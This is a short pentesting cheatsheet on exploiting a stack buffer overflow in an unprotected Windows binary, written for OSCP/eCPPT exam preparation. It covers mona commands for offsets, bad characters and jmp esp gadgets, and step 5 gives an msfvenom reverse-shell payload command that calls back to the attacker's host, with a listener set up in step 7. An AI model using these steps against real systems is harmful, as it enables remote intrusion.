# Buffer overflow cheatsheet for pentesters
This will be a cheatsheet for exploitation of binary services, aimed at pentesters preparing for exams like eCPPT and OSCP (look at other resources for training about binary exploitation in general, like [pwnable.kr](https://pwnable.kr/)).

## BOF Windows (no protections, stack buffer overflow)
Suppose you find an open port, you don't know what service is on it but then you realize that there is a custom binary, by interacting with it with netcat. You may have obtained the binary for that service by interacting with other services (e.g., a path traversal vulnerability in a web application) or from external sources (e.g., OSINT).

### Preparing a local environment for testing the service
At this point, you can't make the service crash by fuzzing it on the target server, you need a reliable exploit. So, you fire up your Windows 7 VM with debugging tools installed (Immunity with mona). You copy the binary there, open it with Immunity, then you run it (`Debug -> Run`). Now you have a local execution of the service you can play with: if the binary crashes, you can see its crash state and restart it.

### Mona cheatsheet
Since you're going to use mona at some points, here's a short cheatsheet for it:
- `!mona config -set workingfolder c:\mona\%p`, run this when you open Immunity debugger, to make mona easier to use (you can change the path if you want).
- `!mona findmsp -distance <NUMBER>`, run this after crashing the binary with a payload generated with `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <NUMBER>`, basically it should read the bytes in EIP and recognize what is the offset of these bytes in the input payload, so that you quickly find the offset of the return address in the stack buffer on which overflow was performed ("EIP offset").
- `!mona bytearray -b "\x00"`, generate a bytearray excluding NULL byte (bad character) and save it into `bytearray.bin` in mona working folder (you can add other bad chars like `"\x00\x08"`).
- `!mona compare -f <path_to_bytearray.bin> -a <address>`, run this after crashing the binary with a payload containing the same contents of the bytearray generated using `!mona bytearray`: the idea is to compare _expected_ and _actual_ to find bad chars; since bad chars may be filtered according to the presence of other bad chars (i.e., there can be some false positive), after running this and having obtained a list of bad chars, you should repeat the generation, crash and comparison by adding only one bad char from the list at a time. These steps must be repeated until the result status returns "Unmodified". Usually, since the binary crashes after performing RET instruction, because at that point EIP will have an invalid value, you can design the payload such to put the _expected_ bytearray after the return address, so that at the crash state of the binary ESP will point to the buffer containing the _actual_ bytearray with which the comparison must be performed.
- `!mona jmp -r esp -cpb "\x00"`, find all JMP gadgets that have ESP register as operand, and whose addresses don't contain the bad char "\x00" (you can add other bad chars like `"\x00\x08"`); if you use the `jmp esp` technique to jump to the payload, then the payload must be like: `padding | jmp_esp_gadget | shellcode`, where the `jmp_esp_gadget` is placed at EIP offset.
- `!mona modules`, find unprotected modules: this could be useful since some modules may have protections enabled, so you will just exploit the presence of unprotected ones.

### Exploitation steps
Suppose that the binary exposes an interface with one or more commands. In theory, all the steps described below can be repeated for any single command, even if the interaction is complex: you have to try long inputs on any command, sub-command, on any prompt, and when you find the vulnerable one, in your script you have to perform the necessary interactions to reach the vulnerable part of the binary. Having said that, it's possible to describe the exploitation steps as if it were only one vulnerable prompt, without complex interactions.

The steps for the exploitation can be summarized as follow:
1. Fuzz the prompt by sending a buffer of increasing length, to roughly find at which length the binary crashes; this requires opening different connections.
2. Use cyclic patterns to find EIP offset; this should only require one connection, after restarting the debug in Immunity (after the previous crash).
3. Find bad characters by iterating the _expected_ versus _actual_ comparison (described in mona cheatsheet); this requires a few connections, but each one with a restart of the debug and generation of a new bytearray with mona with a new bad character.
4. Find gadgets, for example `jmp esp` to jump to a shellcode placed after the return address, or otherwise find another way to redirect the execution flow to a shellcode included in the input. Remember about bad characters when designing a gadget chain.
5. Generate the shellcode with msfvenom: `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`, the `-b` option should be updated with the bad characters found in step 3.
6. Prepend some NOPs to the shellcode, to make sure that the shellcode executes in aligned addresses and also to give it some more space in memory; usually, 16 NOPs should be enough.
7. Start a listener on the port specified in the LPORT parameter in step 5, and run the exploit with the final payload to get the shell. It's better a reverse TCP listener on metasploit than a simple netcat one, because on metasploit you can then upgrade the session to a meterpreter session.
